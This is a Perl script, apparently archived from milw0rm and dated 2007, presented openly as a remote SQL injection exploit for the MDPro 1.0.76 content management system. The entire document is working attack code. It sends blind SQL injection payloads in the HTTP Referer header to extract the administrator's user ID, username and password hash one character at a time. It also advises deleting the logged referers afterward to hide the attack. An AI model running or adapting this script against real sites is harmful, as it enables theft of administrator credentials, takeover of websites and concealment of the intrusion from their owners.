<html><head><title>MDPro 1.0.76 Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

use strict;
use IO::Socket;

my $app = &quot;MDPro 1.0.76&quot;;
my $type = &quot;SQL Injection&quot;;
my $author = &quot;undefined1_&quot;;
my $settings = &quot;magic_quotes_runtime = off, mysql &gt;= 4.1.0&quot;;

$| = 1;
print &quot;:: $app $type - by $author ::\n\n\n&quot;;

my $url = shift || usage();

if($url =~ m/^(?:http:\/\/)(.*)/) {
	$url = $1;
}
if($url !~ m/^.*\/$/) {
	$url .= &quot;/&quot;;
}

get_md5s($url);
print &quot;don't forget to delete the referers from the admin interface...\n&quot;;

sub get_md5s {
	my $url = shift;
	$url .= &quot;index.php&quot;; 
	my $admins_only = shift;
	my $ps = 0;
	my $referer = &quot;Firefox ID=&quot;. randstring(20,25);
	
	my $uid_charset = &quot;1234567890&quot;;
	my $user_charset = &quot;abcdefghijklmnopqrstuvwxyz-_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ][}{+=/\\'\&quot;\@\$#!%^&amp;*()&quot;;
	my $pass_charset = &quot;afc0123456789abde&quot;;
	
	my $data = &quot;GET &quot; . parse_page($url) . &quot; HTTP/1.1\r\n&quot;;
	$data .= &quot;Host: &quot; . parse_host($url) . &quot;\r\n&quot;;
	$data .= &quot;Referer: $referer\r\n&quot;;
	$data .= &quot;Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n&quot;;
	$data .= &quot;Connection: close\r\n\r\n&quot;;
	my $recv = sendpacket(parse_host($url), parse_port($url), $data);
	$ps++;
	
	$data = &quot;GET &quot; . parse_page($url) . &quot; HTTP/1.1\r\n&quot;;
	$data .= &quot;Host: &quot; . parse_host($url) . &quot;\r\n&quot;;
	$data .= &quot;Referer: '\r\n&quot;;
	$data .= &quot;Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n&quot;;
	$data .= &quot;Connection: close\r\n\r\n&quot;;
	$recv = sendpacket(parse_host($url), parse_port($url), $data);
	$ps++;
	if($recv !~ m/Call to undefined function PN_DBMsgError/m) {
		print &quot;magic quotes = on ;-[\n&quot;;
		return $ps;
	}
	
	my $recv;
	my $lastuid = 0;
	while(1) {
		my $uid_length = length(&quot;$lastuid&quot;);
		my $user_length = 1;
		my $pass_length = 32;
		my $uid = &quot;&quot;;
		my $user = &quot;&quot;;
		my $pass = &quot;&quot;;
		my $O_RLY = 0;

		for(my $x = $uid_length; $x &lt;= 8; $x++) {
			print &quot;\ruid length = $uid_length&quot;;
			$data = &quot;GET &quot; . parse_page($url) . &quot; HTTP/1.1\r\n&quot;;
			$data .= &quot;Host: &quot; . parse_host($url) . &quot;\r\n&quot;;
			$data .= &quot;Referer: $referer' and (select 1 from md_group_membership where length(CONCAT(pn_uid))=$x and pn_uid&gt;$lastuid and pn_gid=2 limit 1 order by pn_uid asc)=1 order by 1 asc/*\r\n&quot;;
			$data .= &quot;Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n&quot;;
			$data .= &quot;Connection: close\r\n\r\n&quot;;
			$recv = sendpacket(parse_host($url), parse_port($url), $data);
			$ps++;

			if($recv =~ m/Call to undefined function PN_DBMsgError/m) {
				$uid_length = $x;
				$x = 9;
				$O_RLY = 1;
			}
		}
		
		if($O_RLY == 0) { return $ps; }
		$O_RLY = 0;
		
		print &quot;\ruid length = $uid_length\n&quot;;
		
		for(my $i = 1; $i &lt;= $uid_length; $i++) {
			for(my $j = 0; $j &lt; length($uid_charset); $j++) {
				my $key = substr($uid_charset, $j, 1);
				my $hex_key = sprintf(&quot;0x%02x&quot;, ord($key));
				print &quot;\ruid = $uid$key&quot;;
				
				$data = &quot;GET &quot; . parse_page($url) . &quot; HTTP/1.1\r\n&quot;;
				$data .= &quot;Host: &quot; . parse_host($url) . &quot;\r\n&quot;;
				$data .= &quot;Referer: $referer' and (select 1 from md_group_membership where substring(pn_uid,$i,1)=$hex_key and pn_uid&gt;$lastuid and pn_gid=2 order by pn_uid asc limit 1)=1 order by 1 asc/*\r\n&quot;;
				$data .= &quot;Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n&quot;;
				$data .= &quot;Connection: close\r\n\r\n&quot;;
				$recv = sendpacket(parse_host($url), parse_port($url), $data);
				$ps++;				
				
				if($recv =~ m/Call to undefined function PN_DBMsgError/m) {
					$uid .= $key;
					$j = length($uid_charset);				
				}				
			}	
		}
		
		print &quot;\ruid = $uid\n&quot;;
			
		for(my $x = $user_length; $x &lt;= 25; $x++) {
			print &quot;\ruser length = $x&quot;;
			$data = &quot;GET &quot; . parse_page($url) . &quot; HTTP/1.1\r\n&quot;;
			$data .= &quot;Host: &quot; . parse_host($url) . &quot;\r\n&quot;;
			$data .= &quot;Referer: $referer' and (select 1 from md_users where length(pn_uname)=$x and pn_uid=$uid limit 1)=1 order by 1 asc/*\r\n&quot;;
			$data .= &quot;Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n&quot;;
			$data .= &quot;Connection: close\r\n\r\n&quot;;
			$recv = sendpacket(parse_host($url), parse_port($url), $data);
			$ps++;

			if($recv =~ m/Call to undefined function PN_DBMsgError/m) {
				$user_length = $x;
				$x = 26;
				$O_RLY = 1;
			}
		}
		
		if($O_RLY == 0) { return $ps; }
		$O_RLY = 0;
		
		print &quot;\ruser length = $user_length\n&quot;;
		
		for(my $i = 1; $i &lt;= $user_length; $i++) {
			for(my $j = 0; $j &lt; length($user_charset); $j++) {
				my $key = substr($user_charset, $j, 1);
				my $hex_key = sprintf(&quot;0x%02x&quot;, ord($key));
				print &quot;\ruser = $user$key&quot;;
				
				$data = &quot;GET &quot; . parse_page($url) . &quot; HTTP/1.1\r\n&quot;;
				$data .= &quot;Host: &quot; . parse_host($url) . &quot;\r\n&quot;;
				$data .= &quot;Referer: $referer' and (select 1 from md_users where substring(pn_uname,$i,1)=$hex_key and pn_uid=$uid limit 1)=1 order by 1 asc/*\r\n&quot;;
				$data .= &quot;Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n&quot;;
				$data .= &quot;Connection: close\r\n\r\n&quot;;
				$recv = sendpacket(parse_host($url), parse_port($url), $data);
				$ps++;				
				
				if($recv =~ m/Call to undefined function PN_DBMsgError/m) {
					$user .= $key;
					$j = length($user_charset);				
				}				
			}	
		}
				
		print &quot;\ruser = $user\n&quot;;
		
		
		
		
		# pour le pass, faire genre un tolower du char direct dans la sql query
		
		for(my $i = 1; $i &lt;= $pass_length; $i++) {
			for(my $j = 0; $j &lt; length($pass_charset); $j++) {
				my $key = substr($pass_charset, $j, 1);
				my $hex_key = sprintf(&quot;0x%02x&quot;, ord($key));
				print &quot;\rpassword = $pass$key&quot;;
				
				$data = &quot;GET &quot; . parse_page($url) . &quot; HTTP/1.1\r\n&quot;;
				$data .= &quot;Host: &quot; . parse_host($url) . &quot;\r\n&quot;;
				$data .= &quot;Referer: $referer' and (select 1 from md_users where lower(substring(pn_pass,$i,1))=$hex_key and pn_uid=$uid limit 1)=1 order by 1 asc/*\r\n&quot;;
				$data .= &quot;Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n&quot;;
				$data .= &quot;Connection: close\r\n\r\n&quot;;
				$recv = sendpacket(parse_host($url), parse_port($url), $data);
				$ps++;				
				
				if($recv =~ m/Call to undefined function PN_DBMsgError/m) {
					$pass .= $key;
					$j = length($pass_charset);				
				}				
			}	
		}
				
		print &quot;\rpassword = $pass\n\n&quot;;
		
		
		exit;
	}
}

# ======================================================

sub parse_host {
	my $url = shift;
	if($url =~ m/^([^\/:]+).*\//) {
		return $1;
	}
	return &quot;127.0.0.1&quot;;
}

sub parse_port {
	my $url = shift;
	if($url =~ m/^(?:[^\/:]+):(\d+)\//) {
		return $1;
	}
	return &quot;80&quot;;
}

sub parse_page {
	my $url = shift;
	if($url =~ m/^(?:[^\/]+)(\/.*)/) {
		return $1;
	}
	return &quot;/&quot;;
}

sub randstring(\$,\$) {
	my $min = shift;
	my $max = shift;

	my $length = int( (rand(65535)%($max-$min+1))+$min);
	my $ret = &quot;&quot;;
	for(my $i = 0; $i &lt; $length; $i++)
	{
		my $w = int(rand(3));
		if($w == 0)
		{
			$ret .= chr(97 + int(rand(26)));
		}
		elsif($w == 1)
		{
			$ret .= chr(65 + int(rand(26)));
		}
		else
		{
			$ret .= chr(48 + int(rand(10)));
		}
	}

	return $ret;
}

sub sendpacket {
	my $server = shift;
	my $port = shift;
	my $data = shift;

	my $sock = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $server, PeerPort =&gt; $port) or die &quot;:: Could not connect to $server:80 $!\n&quot;;
	print $sock &quot;$data&quot;;
	
	$data = &quot;&quot;;
	my $resp;
	while($resp = &lt;$sock&gt;)	{ $data .= $resp; }
	
	close($sock);
	return $data;
}

sub usage() {
	printf &quot;usage: %s &lt;url&gt;\n&quot;, $0;	
	exit;
}

# milw0rm.com [2007-09-29]</pre></html>